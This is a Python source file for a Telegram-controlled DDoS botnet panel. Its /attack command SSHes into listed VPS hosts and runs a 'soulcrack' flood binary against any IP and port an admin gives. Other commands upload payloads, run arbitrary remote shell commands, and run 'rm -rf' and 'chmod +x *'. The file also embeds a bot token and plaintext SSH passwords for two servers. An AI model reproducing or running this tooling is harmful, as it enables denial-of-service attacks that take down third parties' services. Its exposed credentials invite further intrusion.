import random
import threading
import paramiko
import json
import requests
import time
import os

TOKEN = "8185809798:AAEvA8T9evqeDzI2Prf-BKS1TaqyPbwPeqc"  # Replace with your bot token
API_URL = f"https://api.telegram.org/bot{TOKEN}"

ADMIN_IDS = [1419969308]  # Replace with your Admin IDs
CONFIG_FILE = "config.json"

# Global variables for configuration
DEFAULT_TIME_DURATION = 120  # Default attack duration in seconds
DEFAULT_THREADS = 100       # Default number of threads

# Dictionary to store temporary data for file uploads
user_data = {}

def is_admin(chat_id):
    """Check if the user is an admin."""
    return chat_id in ADMIN_IDS

def generate_config_file():
    """Generate a default config file if it doesn't exist."""
    default_config = {
        "VPS_LIST": [
            {
                "ip": "45.32.167.254",
                "user": "master_cphdfvjzkc",
                "password": "NTNcvDE58Vkv",
                "busy": False
            },
            {
                "ip": "65.20.87.118",
                "user": "master_ytnmamexsj",
                "password": "rTF6hZ8WQ5ka",
                "busy": False
            }
        ]
    }

    if not os.path.exists("config.json"):
        with open("config.json", "w") as file:
            json.dump(default_config, file, indent=4)
        print("✅ config.json created with default values.")

generate_config_file()

def save_config():
    """Save the configuration to the config file."""
    with open(CONFIG_FILE, "w") as file:
        json.dump(config, file, indent=4)

with open(CONFIG_FILE, "r") as file:
    config = json.load(file)

VPS_LIST = config["VPS_LIST"]
for vps in VPS_LIST:
    if "busy" not in vps:
        vps["busy"] = False

save_config()

def send_message(chat_id, text):
    """Send a message to the user using Telegram Bot API."""
    url = f"{API_URL}/sendMessage"
    params = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
    requests.post(url, params=params)

def get_updates(offset=None):
    """Get new updates (messages) from Telegram."""
    url = f"{API_URL}/getUpdates"
    params = {"timeout": 10, "offset": offset}
    response = requests.get(url, params=params)
    return response.json()

def check_vps_status():
    """Check the status of all VPS and send notifications for down VPS."""
    status_list = []
    failed_vps_list = []
    for vps in VPS_LIST:
        ip, user, password = vps["ip"], vps["user"], vps["password"]
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=user, password=password, timeout=5)
            ssh.close()
            status_list.append(f"✨🟢 `{ip}` **RUNNING** ✅")
        except:
            status_list.append(f"🔥🔴 `{ip}` **DOWN** ❌")
            failed_vps_list.append(ip)
    
    if failed_vps_list:
        failed_vps_message = "\n".join([f"🔥🔴 `{ip}` **DOWN** ❌" for ip in failed_vps_list])
        for admin_id in ADMIN_IDS:
            send_message(admin_id, f"🚨 **ALERT: Some VPS are DOWN!**\n{failed_vps_message}")
    
    return "\n".join(status_list)

def get_available_vps():
    """Find and return available VPS from the VPS_LIST."""
    available_vps = [vps for vps in VPS_LIST if not vps["busy"]]
    return available_vps if available_vps else None

def execute_attack(vps, target, port, duration, threads, chat_id):
    """Execute an attack on the target using the selected VPS."""
    ip, user, password = vps["ip"], vps["user"], vps["password"]
    attack_command = f"./soulcrack {target} {port} {duration} {threads}"

    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, username=user, password=password)

        stdin, stdout, stderr = ssh.exec_command(attack_command)
        output, error = stdout.read().decode(), stderr.read().decode()

        ssh.close()
        vps["busy"] = False

        if error:
            send_message(chat_id, f"❌ **ATTACK FAILED FROM `{ip}`** 😡\nError: {error}")
        else:
            send_message(chat_id, f"✅ **ATTACK COMPLETED FROM `{ip}`** 💀🔥")
    except Exception as e:
        vps["busy"] = False
        send_message(chat_id, f"❌ **ERROR:** {str(e)}")

def handle_attack(chat_id, command):
    """Handle the /attack command."""
    if not is_admin(chat_id):
        send_message(chat_id, "🚫 **This command is restricted to admins only.**")
        return

    command = command.split()
    if len(command) < 3 or len(command) > 5:
        send_message(chat_id, "⚠️ **Usage:** /attack `<IP>` `<PORT>` `<TIME>` `<THREADS>`\n\nExample: `/attack 1.1.1.1 80 120` (uses default 100 threads)")
        return

    target = command[1]
    port = command[2]
    time_duration = command[3] if len(command) > 3 else str(DEFAULT_TIME_DURATION)
    threads = command[4] if len(command) > 4 else str(DEFAULT_THREADS)

    try:
        port = int(port)
        time_duration = int(time_duration)
        threads = int(threads)
    except ValueError:
        send_message(chat_id, "❌ **Error:** Port, time, and threads must be integers!")
        return

    if time_duration > 240:
        send_message(chat_id, "🚫 **Maximum duration is 240 seconds!**")
        return

    if threads > 5000:
        send_message(chat_id, "🚫 **Maximum threads is 5000!**")
        return

    available_vps = get_available_vps()
    if not available_vps:
        send_message(chat_id, "🚫 **All VPS are busy, try again later!**")
        return

    for vps in available_vps:
        vps["busy"] = True
        send_message(chat_id, f"🔥 **Attack started from `{vps['ip']}` on `{target}:{port}` for `{time_duration}`s with `{threads}` threads** 🚀")
        attack_thread = threading.Thread(target=execute_attack, args=(vps, target, port, time_duration, threads, chat_id))
        attack_thread.start()

def handle_cvps(chat_id):
    """Handle the /cvps command."""
    send_message(chat_id, "⏳ **Checking VPS status...**")
    status_message = check_vps_status()
    send_message(chat_id, f"📡 **VPS STATUS:**\n{status_message}")

def handle_avps(chat_id, command):
    """Handle the /avps command."""
    if not is_admin(chat_id):
        send_message(chat_id, "🚫 **This command is restricted to admins only.**")
        return

    command = command.split()
    if len(command) != 4:
        send_message(chat_id, "⚠️ **Usage:** /avps `<IP>` `<USER>` `<PASSWORD>`")
        return

    ip, user, password = command[1], command[2], command[3]
    VPS_LIST.append({"ip": ip, "user": user, "password": password, "busy": False})
    save_config()
    send_message(chat_id, f"✅ **VPS `{ip}` added!** ✨")

def handle_upload_start(chat_id):
    """Handle the /upload command."""
    if not is_admin(chat_id):
        send_message(chat_id, "🚫 **This command is restricted to admins only.**")
        return

    send_message(chat_id, "🔢 **Please enter the IP address of the VPS where you want to upload the file:**")
    user_data[chat_id] = {"step": "upload_ip"}

def handle_upload_ip(chat_id, ip):
    """Handle the IP address input for file upload."""
    vps = next((vps for vps in VPS_LIST if vps["ip"] == ip), None)
    if not vps:
        send_message(chat_id, f"❌ **VPS with IP `{ip}` not found!**")
        return

    user_data[chat_id] = {"step": "upload_file", "ip": ip}
    send_message(chat_id, "📤 **Please upload the file now.**")

def handle_file_upload(chat_id, file_id, file_name):
    """Handle the file upload."""
    if chat_id not in user_data or user_data[chat_id].get("step") != "upload_file":
        send_message(chat_id, "❌ **Please start the upload process using the `/upload` command.**")
        return

    ip = user_data[chat_id]["ip"]
    vps = next((vps for vps in VPS_LIST if vps["ip"] == ip), None)
    if not vps:
        send_message(chat_id, f"❌ **VPS with IP `{ip}` not found!**")
        return

    try:
        file_info = requests.get(f"{API_URL}/getFile?file_id={file_id}").json()
        file_url = f"https://api.telegram.org/file/bot{TOKEN}/{file_info['result']['file_path']}"
        downloaded_file = requests.get(file_url).content

        with open(file_name, 'wb') as new_file:
            new_file.write(downloaded_file)

        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(vps["ip"], username=vps["user"], password=vps["password"], timeout=5)

        scp = ssh.open_sftp()
        scp.put(file_name, f"/root/{file_name}")
        scp.close()
        ssh.close()

        os.remove(file_name)
        send_message(chat_id, f"✅ **File `{file_name}` uploaded successfully to `{ip}`!**")
    except Exception as e:
        send_message(chat_id, f"❌ **Error uploading file to `{ip}`:** {str(e)}")
    finally:
        if chat_id in user_data:
            del user_data[chat_id]

def handle_ls(chat_id, command):
    """Handle the /ls command."""
    if not is_admin(chat_id):
        send_message(chat_id, "🚫 **This command is restricted to admins only.**")
        return

    command = command.split()
    if len(command) != 2:
        send_message(chat_id, "⚠️ **Usage:** /ls `<IP>`")
        return

    ip = command[1]
    vps = next((vps for vps in VPS_LIST if vps["ip"] == ip), None)
    if not vps:
        send_message(chat_id, f"❌ **VPS with IP `{ip}` not found!**")
        return

    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(vps["ip"], username=vps["user"], password=vps["password"], timeout=5)

        stdin, stdout, stderr = ssh.exec_command("ls -p | grep -v /")
        ls_output = stdout.read().decode().strip()
        ssh.close()

        if ls_output:
            send_message(chat_id, f"📂 **Files on `{ip}`:**\n```\n{ls_output}\n```")
        else:
            send_message(chat_id, f"❌ **No files found on `{ip}`.**")
    except Exception as e:
        send_message(chat_id, f"❌ **Error executing `ls` on `{ip}`:** {str(e)}")

def handle_delete(chat_id, command):
    """Handle the /delete command."""
    if not is_admin(chat_id):
        send_message(chat_id, "🚫 **This command is restricted to admins only.**")
        return

    command = command.split()
    if len(command) != 3:
        send_message(chat_id, "⚠️ **Usage:** /delete `<IP>` `<file_or_directory>`")
        return

    ip, file_or_dir = command[1], command[2]
    vps = next((vps for vps in VPS_LIST if vps["ip"] == ip), None)
    if not vps:
        send_message(chat_id, f"❌ **VPS with IP `{ip}` not found!**")
        return

    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(vps["ip"], username=vps["user"], password=vps["password"], timeout=5)

        stdin, stdout, stderr = ssh.exec_command(f"rm -rf {file_or_dir}")
        error = stderr.read().decode().strip()
        ssh.close()

        if error:
            send_message(chat_id, f"❌ **Error deleting `{file_or_dir}` on `{ip}`:** {error}")
        else:
            send_message(chat_id, f"✅ **Successfully deleted `{file_or_dir}` on `{ip}`.**")
    except Exception as e:
        send_message(chat_id, f"❌ **Error executing `delete` on `{ip}`:** {str(e)}")

def handle_terminal(chat_id, command):
    """Handle the /terminal command."""
    if not is_admin(chat_id):
        send_message(chat_id, "🚫 **This command is restricted to admins only.**")
        return

    command = command.split(maxsplit=2)
    if len(command) != 3:
        send_message(chat_id, "⚠️ **Usage:** /terminal `<IP>` `<COMMAND>`")
        return

    ip, terminal_command = command[1], command[2]
    vps = next((vps for vps in VPS_LIST if vps["ip"] == ip), None)
    if not vps:
        send_message(chat_id, f"❌ **VPS with IP `{ip}` not found!**")
        return

    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(vps["ip"], username=vps["user"], password=vps["password"], timeout=5)

        stdin, stdout, stderr = ssh.exec_command(terminal_command)
        output = stdout.read().decode().strip()
        error = stderr.read().decode().strip()
        ssh.close()

        if error:
            send_message(chat_id, f"❌ **Error executing command on `{ip}`:**\n```\n{error}\n```")
        else:
            send_message(chat_id, f"✅ **Command output from `{ip}`:**\n```\n{output}\n```")
    except Exception as e:
        send_message(chat_id, f"❌ **Error executing command on `{ip}`:** {str(e)}")

def handle_chmod(chat_id, command):
    """Handle the /chmod command."""
    if not is_admin(chat_id):
        send_message(chat_id, "🚫 **This command is restricted to admins only.**")
        return

    command = command.split()
    if len(command) != 2:
        send_message(chat_id, "⚠️ **Usage:** /chmod `<IP>`")
        return

    ip = command[1]
    vps = next((vps for vps in VPS_LIST if vps["ip"] == ip), None)
    if not vps:
        send_message(chat_id, f"❌ **VPS with IP `{ip}` not found!**")
        return

    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(vps["ip"], username=vps["user"], password=vps["password"], timeout=5)

        stdin, stdout, stderr = ssh.exec_command("chmod +x *")
        error = stderr.read().decode().strip()
        ssh.close()

        if error:
            send_message(chat_id, f"❌ **Error executing `chmod +x *` on `{ip}`:** {error}")
        else:
            send_message(chat_id, f"✅ **Successfully executed `chmod +x *` on `{ip}`.**")
    except Exception as e:
        send_message(chat_id, f"❌ **Error executing `chmod +x *` on `{ip}`:** {str(e)}")

def show_help(chat_id):
    """Show help message with all available commands."""
    help_msg = """
🚀 **DDoS Bot Commands** 🚀

Admin Commands:
/attack <IP> <PORT> <TIME> <THREADS> - Start DDoS attack
/cvps - Check VPS status
/avps <IP> <USER> <PASS> - Add new VPS
/upload - Upload files to VPS
/ls <IP> - List files on VPS
/delete <IP> <FILE> - Delete file
/terminal <IP> <CMD> - Run command
/chmod <IP> - Make files executable

All Users:
/start - Show this help message
/help - Show available commands
"""
    send_message(chat_id, help_msg)

def main():
    offset = None
    while True:
        updates = get_updates(offset)
        if "result" in updates:
            for update in updates["result"]:
                offset = update["update_id"] + 1
                message = update.get("message")
                if message:
                    chat_id = message["chat"]["id"]
                    text = message.get("text", "").strip()

                    # Handle /start and /help commands
                    if text in ["/start", "/help"]:
                        show_help(chat_id)
                        continue
                    
                    # Handle other commands
                    elif text.startswith("/"):
                        command = text.split()[0]
                        if command == "/attack":
                            handle_attack(chat_id, text)
                        elif command == "/cvps":
                            handle_cvps(chat_id)
                        elif command == "/avps":
                            handle_avps(chat_id, text)
                        elif command == "/upload":
                            handle_upload_start(chat_id)
                        elif command == "/ls":
                            handle_ls(chat_id, text)
                        elif command == "/delete":
                            handle_delete(chat_id, text)
                        elif command == "/terminal":
                            handle_terminal(chat_id, text)
                        elif command == "/chmod":
                            handle_chmod(chat_id, text)
                        else:
                            send_message(chat_id, "❌ **Unknown command. Use `/help` to see available commands.**")
                    elif "document" in message:
                        file_id = message["document"]["file_id"]
                        file_name = message["document"]["file_name"]
                        handle_file_upload(chat_id, file_id, file_name)
                    elif chat_id in user_data and user_data[chat_id].get("step") == "upload_ip":
                        handle_upload_ip(chat_id, text)
        time.sleep(1)

if __name__ == "__main__":
    main()